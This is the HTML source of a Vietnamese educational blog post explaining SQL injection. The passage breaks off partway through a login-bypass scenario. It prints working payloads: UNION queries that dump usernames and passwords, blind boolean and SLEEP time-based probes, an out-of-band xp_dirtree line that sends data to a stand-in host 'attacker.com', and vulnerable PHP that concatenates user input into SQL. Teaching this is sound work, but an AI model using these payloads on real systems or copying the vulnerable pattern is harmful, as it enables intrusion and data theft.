@@ -1,0 +1,946 @@
+<!DOCTYPE html>
+<html lang="vi">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="color-scheme" content="light dark">
+  
+
+
+
+<meta name="description" content="SQL Injection – Khi một dòng query có thể phá hủy tất cả">
+
+  <title>SQL Injection – Khi một dòng query có thể phá hủy tất cả</title>
+  <link rel="icon" type="image/png" sizes="32x32" href="https://wen.is-a.dev/img/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="https://wen.is-a.dev/img/favicon-16x16.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="https://wen.is-a.dev/img/apple-touch-icon.png">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link
+    href="https://fonts.googleapis.com/css2?family=Amatic+SC:wght@400;700&family=Ancizar+Sans:ital,wght@0,100..1000;1,100..1000&family=Bitter:ital,wght@0,100..900;1,100..900&family=Indie+Flower&family=Lora:ital,wght@0,400..700;1,400..700&family=Marcellus&display=swap"
+    rel="stylesheet">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Nunito:ital,wght@0,400;0,600;1,400;1,600&display=swap"
+    rel="stylesheet">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@500..700&display=swap" rel="stylesheet">
+  
+  <style>
+  /* light mode colors */
+  body {
+    /* --primary-color: #5871a2; */
+    --primary-color: #005e05;
+    --primary-pale-color: #5871a233;
+    --primary-decoration-color: #5871a210;
+    --bg-color: #f0f9ff;
+    /* --text-color: #2f3030; */
+    --text-color: #000000;
+    /* --text-pale-color: #767676; */
+    --text-pale-color: #000000;
+    --text-decoration-color: #a9a9a9;
+    --highlight-mark-color: #5f75b020;
+
+    --callout-note-color: #5871a2;
+    --callout-tip-color: #268556;
+    --callout-important-color: #885fc9;
+    --callout-warning-color: #ab6632;
+    --callout-caution-color: #c64e4e;
+  }
+
+  /* dark mode colors */
+  body.dark {
+    /* --primary-color: #6f8fd1; */
+    --primary-color: #ecf16b;
+    --primary-pale-color: #6f8fd166;
+    --primary-decoration-color: #6f8fd112;
+    /* --bg-color: #1c1c1c; */
+    /* --bg-color: #002727; */
+    /* --bg-color: #002333; */
+    --bg-color: #01242E;
+    /* --text-color: #c1c1c1; */
+    --text-color: #ffffff;
+    /* --text-pale-color: #848484; */
+    --text-pale-color: #ffffff;
+    --text-decoration-color: #5f5f5f;
+    --highlight-mark-color: #8296cb3b;
+
+    --callout-note-color: #6f8fd1;
+    --callout-tip-color: #47976f;
+    --callout-important-color: #9776cd;
+    --callout-warning-color: #ad7a52;
+    --callout-caution-color: #d06161;
+  }
+
+  /* typography */
+  body {
+    /* --main-font: ui-sans-serif, system-ui, sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji'; */
+    --main-font: 'Nunito', ui-sans-serif, system-ui, sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
+    --heading-font: 'Quicksand', 'Lora', 'Bitter', ui-sans-serif, system-ui, sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji';
+
+    --code-font: 'Cascadia Code', 'Fira Code', ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, 'Liberation Mono', 'Courier New', monospace;
+    --homepage-max-width: 768px;
+    --main-max-width: 768px;
+    --avatar-size: 75px;
+    --font-size: 16px;
+    --line-height: 1.75;
+    --img-border-radius: 0px;
+    --detail-border-radius: 11px;
+    --dark-mode-img-brightness: 0.75;
+    --dark-mode-chart-brightness: 0.75;
+    --inline-code-border-radius: 2px;
+    --inline-code-bg-color: var(--primary-decoration-color);
+    --block-code-border-radius: 0px;
+    --block-code-border-color: var(--primary-color);
+    --detail-border-color: var(--primary-color);
+  }
+
+
+  #name,
+  #id,
+  #left,
+  a.post,
+  a.back-link,
+  a.tag,
+  a.category,
+  .title {
+    font-family: var(--heading-font);
+  }
+
+  span.date {
+    font-family: var(--code-font);
+    color: var(--text-pale-color);
+  }
+
+  .gif-wrapper {
+    text-align: center;
+    margin: 1.5rem 0;
+  }
+
+  .gif-wrapper .intro-gif {
+    max-width: 96%;
+    height: auto;
+    border-radius: 8px;
+  }
+
+  .verified-icon {
+    display: inline-flex;
+    align-items: center;
+    margin-bottom: 3px;
+    vertical-align: middle;
+  }
+
+  .verified-icon svg {
+    width: 16px;
+    height: 16px;
+  }
+
+  .top-nav {
+    width: 100%;
+    padding-bottom: 1em;
+    border-bottom: 1px solid var(--border-color);
+    background: rgba(var(--background-rgb), 0.85);
+    backdrop-filter: blur(8px);
+    border-radius: var(--detail-border-radius);
+    position: sticky;
+    top: 0;
+    z-index: 1000;
+  }
+
+  .top-nav nav {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    height: 40px;
+  }
+
+  .nav-left,
+  .nav-center,
+  .nav-right {
+    display: flex;
+    align-items: center;
+  }
+
+  .nav-center {
+    flex: 1;
+    justify-content: center;
+  }
+
+  .avatar {
+    width: 32px;
+    height: 32px;
+    border-radius: 50%;
+    margin-top: 1em;
+  }
+
+  .menu-wrapper {
+    position: relative;
+    margin-top: 1.5em;
+  }
+
+  .menu-trigger {
+    font-size: 1.5em;
+    background: transparent;
+    border: none;
+    cursor: pointer;
+    color: var(--text-color);
+  }
+
+  .menu-dropdown {
+    position: absolute;
+    top: 100%;
+    right: 0;
+    display: flex;
+    flex-direction: column;
+
+    background: var(--bg-color);
+    font-family: var(--heading-font);
+    border: 1px solid var(--primary-pale-color);
+    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+    border-radius: 8px;
+    min-width: 85px;
+    padding: 0.25em 0;
+    z-index: 2000;
+
+    opacity: 0;
+    transform: translateY(-10px);
+    pointer-events: none;
+    transition: opacity 0.25s ease, transform 0.25s ease;
+  }
+
+  .menu-wrapper.active .menu-dropdown {
+    opacity: 1;
+    transform: translateY(0);
+    pointer-events: auto;
+  }
+
+
+  .menu-dropdown a {
+    display: block;
+    padding: 0.6em 1em;
+    text-decoration: none;
+    color: var(--text-color);
+    font-size: 0.95em;
+    margin: auto;
+    transition: background 0.2s ease, color 0.2s ease;
+  }
+
+  #theme-toggle:hover,
+  #rain-toggle:hover {
+    cursor: pointer;
+  }
+
+  .foot-quote,
+  .section-title {
+    font-family: 'Lora', serif;
+    font-style: italic;
+    text-align: center;
+    display: block;
+    margin-top: 2em;
+  }
+
+  .layout-list .post {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 1em;
+  }
+
+  .post>span:first-child {
+    flex: 1;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    min-width: 0;
+  }
+
+  .post>.date {
+    flex-shrink: 0;
+    white-space: nowrap;
+  }
+
+  .year-heading {
+    margin-top: 1.5em;
+    margin-bottom: 0.5em;
+    font-size: 1.5em;
+    font-weight: bold;
+    font-family: var(--heading-font);
+  }
+
+  /* term-caret  */
+  #id.term-caret {
+    font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
+    position: relative;
+    white-space: nowrap;
+  }
+
+  #id.term-caret::after {
+    content: "_";
+
+    margin-left: 4px;
+    animation: blink 1s steps(1, end) infinite;
+    opacity: 1;
+    color: currentColor;
+  }
+
+  @keyframes blink {
+    50% {
+      opacity: 0;
+    }
+  }
+
+  @media (prefers-reduced-motion: reduce) {
+    #id.term-caret::after {
+      animation: none;
+      opacity: 1;
+    }
+  }
+
+  /* typewriter */
+  #id.typewriter {
+    font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
+    white-space: nowrap;
+    border-right: 1ch solid currentColor;
+    /* caret */
+    /* caret blink */
+    animation: caret-blink 1s steps(1, end) infinite;
+  }
+
+  @keyframes caret-blink {
+    50% {
+      border-right-color: transparent;
+    }
+  }
+
+  @media (prefers-reduced-motion: reduce) {
+    #id.typewriter {
+      animation: none;
+      border-right-color: currentColor;
+    }
+  }
+
+  /* glitch effect  */
+  #id.glitch {
+    position: relative;
+    display: inline-block;
+    font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
+  }
+
+  #id.glitch::before,
+  #id.glitch::after {
+    content: attr(data-text);
+    position: absolute;
+    left: 0;
+    top: 0;
+    clip-path: inset(0 0 0 0);
+    opacity: .85;
+  }
+
+  #id.glitch::before {
+    transform: translate(0, 0);
+    mix-blend-mode: screen;
+    text-shadow: 1px 0 0 #f00;
+    /* viền đỏ */
+    animation: glitch-1 2s infinite linear alternate-reverse;
+  }
+
+  #id.glitch::after {
+    transform: translate(0, 0);
+    mix-blend-mode: screen;
+    text-shadow: -1px 0 0 #0ff;
+    /* viền cyan */
+    animation: glitch-2 2.2s infinite linear alternate-reverse;
+  }
+
+  @keyframes glitch-1 {
+    0% {
+      clip-path: inset(0 0 85% 0);
+      transform: translate(0, 0);
+    }
+
+    20% {
+      clip-path: inset(10% 0 60% 0);
+      transform: translate(-1px, -1px);
+    }
+
+    40% {
+      clip-path: inset(40% 0 30% 0);
+      transform: translate(1px, 1px);
+    }
+
+    60% {
+      clip-path: inset(20% 0 55% 0);
+      transform: translate(-1px, 0);
+    }
+
+    80% {
+      clip-path: inset(70% 0 5% 0);
+      transform: translate(0, 1px);
+    }
+
+    100% {
+      clip-path: inset(0 0 85% 0);
+      transform: translate(0, 0);
+    }
+  }
+
+  @keyframes glitch-2 {
+    0% {
+      clip-path: inset(70% 0 5% 0);
+      transform: translate(0, 0);
+    }
+
+    20% {
+      clip-path: inset(40% 0 30% 0);
+      transform: translate(1px, 0);
+    }
+
+    40% {
+      clip-path: inset(10% 0 60% 0);
+      transform: translate(0, -1px);
+    }
+
+    60% {
+      clip-path: inset(0 0 85% 0);
+      transform: translate(-1px, 1px);
+    }
+
+    80% {
+      clip-path: inset(20% 0 55% 0);
+      transform: translate(1px, 0);
+    }
+
+    100% {
+      clip-path: inset(70% 0 5% 0);
+      transform: translate(0, 0);
+    }
+  }
+
+  @media (prefers-reduced-motion: reduce) {
+
+    #id.glitch::before,
+    #id.glitch::after {
+      animation: none;
+    }
+  }
+</style>
+  <link rel="stylesheet" href="https://wen.is-a.dev/main.css">
+  
+
+<link id="hl" rel="stylesheet" type="text/css" href="/hl-light.css" />
+
+
+
+  
+</head>
+
+<body class="post">
+
+  
+  <script>
+    const theme = sessionStorage.getItem('theme');
+    const match = window.matchMedia("(prefers-color-scheme: dark)").matches;
+    if ((theme && theme === 'dark') || (!theme && match)) {
+      document.body.classList.add('dark');
+      const hl = document.querySelector('link#hl');
+      if (hl) hl.href = 'https://wen.is-a.dev/hl-dark.css';
+    }
+  </script>
+  
+
+  
+<div id="wrapper">
+  <div id="blank"></div>
+  <aside>
+    
+    
+    
+    <button id="back-to-top" aria-label="back to top">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-up"><line x1="12" y1="19" x2="12" y2="5"></line><polyline points="5 12 12 5 19 12"></polyline></svg>
+
+    </button>
+    
+  </aside>
+  <main>
+    
+<header class="top-nav">
+  <nav>
+    <!-- Left: Back -->
+    <div class="nav-left">
+      <a href="https:&#x2F;&#x2F;wen.is-a.dev&#x2F;posts" class="back-link">← Back</a>
+    </div>
+
+    <!-- Center: Avatar -->
+    <div class="nav-center">
+      
+      <a href="/">
+        <img src="https://wen.is-a.dev/img/qwe.jpg" alt="avatar" class="avatar">
+      </a>
+      
+    </div>
+
+    <!-- Right: Menu dropdown -->
+    <div class="nav-right">
+
+      <div class="menu-wrapper">
+
+        <button class="menu-trigger" aria-label="menu">
+          &#9776;
+        </button>
+        <div class="menu-dropdown">
+          <a href="https://wen.is-a.dev/posts">POSTS</a>
+          <a href="https://wen.is-a.dev/about">ABOUT</a>
+          <a href="https://wen.is-a.dev/contact">CONTACT</a>
+          
+          
+          
+          
+          
+
+          <a id="theme-toggle" aria-label="theme switch">
+            <span class="moon-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="18" height="18"><path d="M10 7C10 10.866 13.134 14 17 14C18.9584 14 20.729 13.1957 21.9995 11.8995C22 11.933 22 11.9665 22 12C22 17.5228 17.5228 22 12 22C6.47715 22 2 17.5228 2 12C2 6.47715 6.47715 2 12 2C12.0335 2 12.067 2 12.1005 2.00049C10.8043 3.27098 10 5.04157 10 7ZM4 12C4 16.4183 7.58172 20 12 20C15.0583 20 17.7158 18.2839 19.062 15.7621C18.3945 15.9187 17.7035 16 17 16C12.0294 16 8 11.9706 8 7C8 6.29648 8.08133 5.60547 8.2379 4.938C5.71611 6.28423 4 8.9417 4 12Z" fill="currentColor"></path></svg>
+</span>
+            <span class="sun-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="18" height="18"><path d="M12 18C8.68629 18 6 15.3137 6 12C6 8.68629 8.68629 6 12 6C15.3137 6 18 8.68629 18 12C18 15.3137 15.3137 18 12 18ZM12 16C14.2091 16 16 14.2091 16 12C16 9.79086 14.2091 8 12 8C9.79086 8 8 9.79086 8 12C8 14.2091 9.79086 16 12 16ZM11 1H13V4H11V1ZM11 20H13V23H11V20ZM3.51472 4.92893L4.92893 3.51472L7.05025 5.63604L5.63604 7.05025L3.51472 4.92893ZM16.9497 18.364L18.364 16.9497L20.4853 19.0711L19.0711 20.4853L16.9497 18.364ZM19.0711 3.51472L20.4853 4.92893L18.364 7.05025L16.9497 5.63604L19.0711 3.51472ZM5.63604 16.9497L7.05025 18.364L4.92893 20.4853L3.51472 19.0711L5.63604 16.9497ZM23 11V13H20V11H23ZM4 11V13H1V11H4Z" fill="currentColor"></path></svg>
+</span>
+          </a>
+
+          
+        </div>
+      </div>
+    </div>
+  </nav>
+</header>
+<script>
+  document.addEventListener("DOMContentLoaded", () => {
+    const trigger = document.querySelector(".menu-trigger");
+    const wrapper = document.querySelector(".menu-wrapper");
+
+    if (trigger && wrapper) {
+      trigger.addEventListener("click", () => {
+        wrapper.classList.toggle("active");
+      });
+
+      document.addEventListener("click", (e) => {
+        if (!wrapper.contains(e.target)) {
+          wrapper.classList.remove("active");
+        }
+      });
+    }
+  });
+
+</script>
+
+
+    <div>
+      
+      
+      
+      
+      <div id="copy-cfg" style="display: none;" data-copy-icon="&lt;svg xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2000&#x2F;svg&quot; viewBox=&quot;0 0 24 24&quot; width=&quot;18&quot; height=&quot;18&quot;&gt;&lt;path d=&quot;M6.9998 6V3C6.9998 2.44772 7.44752 2 7.9998 2H19.9998C20.5521 2 20.9998 2.44772 20.9998 3V17C20.9998 17.5523 20.5521 18 19.9998 18H16.9998V20.9991C16.9998 21.5519 16.5499 22 15.993 22H4.00666C3.45059 22 3 21.5554 3 20.9991L3.0026 7.00087C3.0027 6.44811 3.45264 6 4.00942 6H6.9998ZM5.00242 8L5.00019 20H14.9998V8H5.00242ZM8.9998 6H16.9998V16H18.9998V4H8.9998V6Z&quot; fill=&quot;currentColor&quot;&gt;&lt;&#x2F;path&gt;&lt;&#x2F;svg&gt;
+" data-check-icon="&lt;svg xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2000&#x2F;svg&quot; viewBox=&quot;0 0 24 24&quot; width=&quot;18&quot; height=&quot;18&quot;&gt;&lt;path d=&quot;M10.0007 15.1709L19.1931 5.97852L20.6073 7.39273L10.0007 17.9993L3.63672 11.6354L5.05093 10.2212L10.0007 15.1709Z&quot; fill=&quot;currentColor&quot;&gt;&lt;&#x2F;path&gt;&lt;&#x2F;svg&gt;
+">
+      </div>
+      
+      <article class="prose">
+        <h1 class="title">SQL Injection – Khi một dòng query có thể phá hủy tất cả</h1>
+        <div id="post-info">
+          <div id="date">
+            <span id="publish">Dec 25, 2024</span>
+            </div>
+
+          
+        </div>
+
+        
+        
+
+        
+
+        <p>Nếu bạn nghĩ SQL Injection chỉ là một từ khóa fancy để làm cho resume trông pro hơn, thì mình có tin buồn: đây chính là lý do tại sao tài khoản ngân hàng của bạn có thể bị "thăm nom" bởi những người bạn chưa bao giờ mời.</p>
+<p>SQL Injection không chỉ là #1 trong OWASP Top 10 suốt nhiều năm mà còn là "classic hit" trong thế giới cybersecurity - giống như "Despacito" vậy, ai cũng biết nhưng vẫn cứ nghe hoài.</p>
+<h2 id="sql-injection-la-cai-quai-gi">SQL Injection Là Cái Quái Gì?<a class="zola-anchor" href="#sql-injection-la-cai-quai-gi" aria-label="Anchor link for: sql-injection-la-cai-quai-gi" style="visibility: hidden;"></a></h2>
+<p>SQL Injection (SQLi) xảy ra khi kẻ tấn công có thể "len lỏi" SQL code độc hại vào các câu query của ứng dụng. Hình dung như thế này: bạn đang nói chuyện với database bằng tiếng SQL, và đột nhiên có người chen ngang, thay đổi câu nói của bạn thành thứ hoàn toàn khác.</p>
+<p><strong>Ví dụ đơn giản:</strong></p>
+<pre data-lang="sql" class="language-sql z-code"><code class="language-sql" data-lang="sql"><span class="z-source z-sql"><span class="z-comment z-line z-double-dash z-sql"><span class="z-punctuation z-definition z-comment z-sql">--</span> Query bình thường
+</span></span><span class="z-source z-sql"><span class="z-keyword z-other z-DML z-sql">SELECT</span> <span class="z-variable z-language z-star z-sql">*</span> <span class="z-keyword z-other z-DML z-sql">FROM</span> users <span class="z-keyword z-other z-DML z-sql">WHERE</span> username <span class="z-keyword z-operator z-comparison z-sql">=</span> <span class="z-string z-quoted z-single z-sql"><span class="z-punctuation z-definition z-string z-begin z-sql">&#39;</span>admin<span class="z-punctuation z-definition z-string z-end z-sql">&#39;</span></span> <span class="z-keyword z-operator z-logical z-sql">AND</span> password <span class="z-keyword z-operator z-comparison z-sql">=</span> <span class="z-string z-quoted z-single z-sql"><span class="z-punctuation z-definition z-string z-begin z-sql">&#39;</span>password123<span class="z-punctuation z-definition z-string z-end z-sql">&#39;</span></span>
+</span><span class="z-source z-sql">
+</span><span class="z-source z-sql"><span class="z-comment z-line z-double-dash z-sql"><span class="z-punctuation z-definition z-comment z-sql">--</span> Query sau khi bị injection
+</span></span><span class="z-source z-sql"><span class="z-keyword z-other z-DML z-sql">SELECT</span> <span class="z-variable z-language z-star z-sql">*</span> <span class="z-keyword z-other z-DML z-sql">FROM</span> users <span class="z-keyword z-other z-DML z-sql">WHERE</span> username <span class="z-keyword z-operator z-comparison z-sql">=</span> <span class="z-string z-quoted z-single z-sql"><span class="z-punctuation z-definition z-string z-begin z-sql">&#39;</span>admin<span class="z-punctuation z-definition z-string z-end z-sql">&#39;</span></span><span class="z-comment z-line z-double-dash z-sql"><span class="z-punctuation z-definition z-comment z-sql">--</span>&#39; AND password = &#39;anything&#39;
+</span></span></code></pre>
+<p>Dấu <code>--</code> trong SQL là comment, nghĩa là mọi thứ phía sau nó sẽ bị bỏ qua. Vậy là password check bị "vô hiệu hóa" một cách lịch sự.</p>
+<h2 id="anatomy-cua-mot-cuoc-tan-cong-sql-injection">Anatomy Của Một Cuộc Tấn Công SQL Injection<a class="zola-anchor" href="#anatomy-cua-mot-cuoc-tan-cong-sql-injection" aria-label="Anchor link for: anatomy-cua-mot-cuoc-tan-cong-sql-injection" style="visibility: hidden;"></a></h2>
+<h3 id="discovery-phase"><strong>Discovery Phase</strong><a class="zola-anchor" href="#discovery-phase" aria-label="Anchor link for: discovery-phase" style="visibility: hidden;"></a></h3>
+<p>Hacker không phải là người đi bộ rồi tình cờ gặp được website vulnerable. Họ có systematic approach:</p>
+<p><strong>Error-based Discovery:</strong></p>
+<pre class="z-code"><code><span class="z-text z-plain">https://vulnerable-site.com/product?id=1&#39;
+</span></code></pre>
+<p>Nếu website trả về lỗi kiểu:</p>
+<pre class="z-code"><code><span class="z-text z-plain">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version...
+</span></code></pre>
+<p>Chúc mừng! Bạn vừa tự "tố" mình rằng website vulnerable với SQL injection.</p>
+<p><strong>Boolean-based Discovery:</strong></p>
+<pre class="z-code"><code><span class="z-text z-plain">https://vulnerable-site.com/product?id=1 AND 1=1  // Trang load bình thường
+</span><span class="z-text z-plain">https://vulnerable-site.com/product?id=1 AND 1=2  // Trang bị lỗi hoặc không load
+</span></code></pre>
+<h3 id="information-gathering"><strong>Information Gathering</strong><a class="zola-anchor" href="#information-gathering" aria-label="Anchor link for: information-gathering" style="visibility: hidden;"></a></h3>
+<p>Một khi xác định được injection point, hacker sẽ thu thập thông tin về database:</p>
+<p><strong>Database Version:</strong></p>
+<pre data-lang="sql" class="language-sql z-code"><code class="language-sql" data-lang="sql"><span class="z-source z-sql"><span class="z-string z-quoted z-single z-sql"><span class="z-punctuation z-definition z-string z-begin z-sql">&#39;</span> UNION SELECT VERSION()--
+</span></span></code></pre>
+<p><strong>Table Names:</strong></p>
+<pre data-lang="sql" class="language-sql z-code"><code class="language-sql" data-lang="sql"><span class="z-source z-sql"><span class="z-string z-quoted z-single z-sql"><span class="z-punctuation z-definition z-string z-begin z-sql">&#39;</span> UNION SELECT table_name FROM information_schema.tables--
+</span></span></code></pre>
+<p><strong>Column Names:</strong></p>
+<pre data-lang="sql" class="language-sql z-code"><code class="language-sql" data-lang="sql"><span class="z-source z-sql"><span class="z-string z-quoted z-single z-sql"><span class="z-punctuation z-definition z-string z-begin z-sql">&#39;</span> UNION SELECT column_name FROM information_schema.columns WHERE table_name=<span class="z-punctuation z-definition z-string z-end z-sql">&#39;</span></span>users<span class="z-string z-quoted z-single z-sql"><span class="z-punctuation z-definition z-string z-begin z-sql">&#39;</span>--
+</span></span></code></pre>
+<h3 id="data-extraction"><strong>Data Extraction</strong><a class="zola-anchor" href="#data-extraction" aria-label="Anchor link for: data-extraction" style="visibility: hidden;"></a></h3>
+<p>Đây là lúc mọi thứ trở nên nghiêm trọng:</p>
+<pre data-lang="sql" class="language-sql z-code"><code class="language-sql" data-lang="sql"><span class="z-source z-sql"><span class="z-string z-quoted z-single z-sql"><span class="z-punctuation z-definition z-string z-begin z-sql">&#39;</span> UNION SELECT username, password FROM users--
+</span></span></code></pre>
+<h2 id="cac-loai-sql-injection-gia-dinh-nha-sqli">Các Loại SQL Injection: "Gia Đình Nhà Sqli"<a class="zola-anchor" href="#cac-loai-sql-injection-gia-dinh-nha-sqli" aria-label="Anchor link for: cac-loai-sql-injection-gia-dinh-nha-sqli" style="visibility: hidden;"></a></h2>
+<h3 id="in-band-sql-injection"><strong>In-band SQL Injection</strong><a class="zola-anchor" href="#in-band-sql-injection" aria-label="Anchor link for: in-band-sql-injection" style="visibility: hidden;"></a></h3>
+<p><em>"Loại thẳng thắn, không che giấu"</em></p>
+<p><strong>Error-based:</strong>
+Lỗi database được hiển thị trực tiếp trên webpage. Giống như việc bạn la hét "TÔI ĐANG BỊ HACK" trên speaker.</p>
+<pre data-lang="sql" class="language-sql z-code"><code class="language-sql" data-lang="sql"><span class="z-source z-sql"><span class="z-comment z-line z-double-dash z-sql"><span class="z-punctuation z-definition z-comment z-sql">--</span> Input: &#39; OR 1=1 UNION SELECT null,@@version,null--
+</span></span><span class="z-source z-sql"><span class="z-comment z-line z-double-dash z-sql"><span class="z-punctuation z-definition z-comment z-sql">--</span> Error: Duplicate column name &#39;version 5.7.29-log&#39;
+</span></span></code></pre>
+<p><strong>Union-based:</strong>
+Sử dụng UNION operator để kết hợp kết quả của câu query gốc với câu query độc hại.</p>
+<pre data-lang="sql" class="language-sql z-code"><code class="language-sql" data-lang="sql"><span class="z-source z-sql"><span class="z-string z-quoted z-single z-sql"><span class="z-punctuation z-definition z-string z-begin z-sql">&#39;</span> UNION SELECT null,username,password FROM admin--
+</span></span></code></pre>
+<h3 id="inferential-sql-injection-blind"><strong>Inferential SQL Injection (Blind)</strong><a class="zola-anchor" href="#inferential-sql-injection-blind" aria-label="Anchor link for: inferential-sql-injection-blind" style="visibility: hidden;"></a></h3>
+<p><em>"Loại bí ẩn, phải đoán mò"</em></p>
+<p><strong>Boolean-based:</strong></p>
+<pre data-lang="sql" class="language-sql z-code"><code class="language-sql" data-lang="sql"><span class="z-source z-sql"><span class="z-comment z-line z-double-dash z-sql"><span class="z-punctuation z-definition z-comment z-sql">--</span> Nếu admin user tồn tại, trang trả về content bình thường
+</span></span><span class="z-source z-sql"><span class="z-string z-quoted z-single z-sql"><span class="z-punctuation z-definition z-string z-begin z-sql">&#39;</span> AND (SELECT COUNT(*) FROM users WHERE username=<span class="z-punctuation z-definition z-string z-end z-sql">&#39;</span></span>admin<span class="z-string z-quoted z-single z-sql"><span class="z-punctuation z-definition z-string z-begin z-sql">&#39;</span>)=1--
+</span></span><span class="z-source z-sql"><span class="z-string z-quoted z-single z-sql">
+</span></span><span class="z-source z-sql"><span class="z-string z-quoted z-single z-sql">-- Nếu không tồn tại, trang trả về content khác hoặc lỗi
+</span></span><span class="z-source z-sql"><span class="z-string z-quoted z-single z-sql"><span class="z-punctuation z-definition z-string z-end z-sql">&#39;</span></span> <span class="z-keyword z-operator z-logical z-sql">AND</span> (<span class="z-keyword z-other z-DML z-sql">SELECT</span> <span class="z-support z-function z-aggregate z-sql">COUNT</span>(<span class="z-variable z-language z-star z-sql">*</span>) <span class="z-keyword z-other z-DML z-sql">FROM</span> users <span class="z-keyword z-other z-DML z-sql">WHERE</span> username<span class="z-keyword z-operator z-comparison z-sql">=</span><span class="z-string z-quoted z-single z-sql"><span class="z-punctuation z-definition z-string z-begin z-sql">&#39;</span>admin<span class="z-punctuation z-definition z-string z-end z-sql">&#39;</span></span>)<span class="z-keyword z-operator z-comparison z-sql">=</span><span class="z-constant z-numeric z-sql">0</span><span class="z-comment z-line z-double-dash z-sql"><span class="z-punctuation z-definition z-comment z-sql">--</span>
+</span></span></code></pre>
+<p><strong>Time-based:</strong></p>
+<pre data-lang="sql" class="language-sql z-code"><code class="language-sql" data-lang="sql"><span class="z-source z-sql"><span class="z-comment z-line z-double-dash z-sql"><span class="z-punctuation z-definition z-comment z-sql">--</span> Nếu điều kiện đúng, database sẽ &quot;ngủ&quot; 5 giây
+</span></span><span class="z-source z-sql"><span class="z-string z-quoted z-single z-sql"><span class="z-punctuation z-definition z-string z-begin z-sql">&#39;</span> AND IF(1=1,SLEEP(5),0)--
+</span></span><span class="z-source z-sql"><span class="z-string z-quoted z-single z-sql">
+</span></span><span class="z-source z-sql"><span class="z-string z-quoted z-single z-sql">-- Nếu sai, response trả về ngay lập tức
+</span></span><span class="z-source z-sql"><span class="z-string z-quoted z-single z-sql"><span class="z-punctuation z-definition z-string z-end z-sql">&#39;</span></span> <span class="z-keyword z-operator z-logical z-sql">AND</span> IF(<span class="z-constant z-numeric z-sql">1</span><span class="z-keyword z-operator z-comparison z-sql">=</span><span class="z-constant z-numeric z-sql">2</span>,SLEEP(<span class="z-constant z-numeric z-sql">5</span>),<span class="z-constant z-numeric z-sql">0</span>)<span class="z-comment z-line z-double-dash z-sql"><span class="z-punctuation z-definition z-comment z-sql">--</span>
+</span></span></code></pre>
+<h3 id="out-of-band-sql-injection"><strong>Out-of-band SQL Injection</strong><a class="zola-anchor" href="#out-of-band-sql-injection" aria-label="Anchor link for: out-of-band-sql-injection" style="visibility: hidden;"></a></h3>
+<p><em>"Loại gián điệp, dùng kênh bí mật"</em></p>
+<p>Sử dụng kênh khác (DNS, HTTP requests) để truyền dữ liệu:</p>
+<pre data-lang="sql" class="language-sql z-code"><code class="language-sql" data-lang="sql"><span class="z-source z-sql"><span class="z-string z-quoted z-single z-sql"><span class="z-punctuation z-definition z-string z-begin z-sql">&#39;</span>; EXEC xp_dirtree <span class="z-punctuation z-definition z-string z-end z-sql">&#39;</span></span>\\<span class="z-constant z-other z-database-name z-sql">attacker</span>.<span class="z-constant z-other z-table-name z-sql">com</span>\share\<span class="z-string z-quoted z-single z-sql"><span class="z-punctuation z-definition z-string z-begin z-sql">&#39;</span>+@@version+<span class="z-punctuation z-definition z-string z-end z-sql">&#39;</span></span>\<span class="z-string z-quoted z-single z-sql"><span class="z-punctuation z-definition z-string z-begin z-sql">&#39;</span>--
+</span></span></code></pre>
+<h2 id="real-world-attack-scenarios-chuyen-co-that-tu-doi-thuc">Real-world Attack Scenarios: "Chuyện Có Thật Từ Đời Thực"<a class="zola-anchor" href="#real-world-attack-scenarios-chuyen-co-that-tu-doi-thuc" aria-label="Anchor link for: real-world-attack-scenarios-chuyen-co-that-tu-doi-thuc" style="visibility: hidden;"></a></h2>
+<h3 id="scenario-1-login-bypass-kinh-dien">Scenario 1: "Login Bypass Kinh Điển"<a class="zola-anchor" href="#scenario-1-login-bypass-kinh-dien" aria-label="Anchor link for: scenario-1-login-bypass-kinh-dien" style="visibility: hidden;"></a></h3>
+<p><strong>Vulnerable Code:</strong></p>
+<pre data-lang="php" class="language-php z-code"><code class="language-php" data-lang="php"><span class="z-embedding z-php"><span class="z-text z-html z-basic">$query = &quot;SELECT * FROM users WHERE username = &#39;$username&#39; AND password = &#39;$password&#39;&quot;;
+</span></span></code></pre>
+<p><strong>Attack:</strong></p>
+<pre class="z-code"><code><span class="z-text z-plain">Username: admin&#39;--
+</span><span class="z-text z-plain">Password: anything
+</span></code></pre>
+<p><strong>Resulting Query:</strong></p>
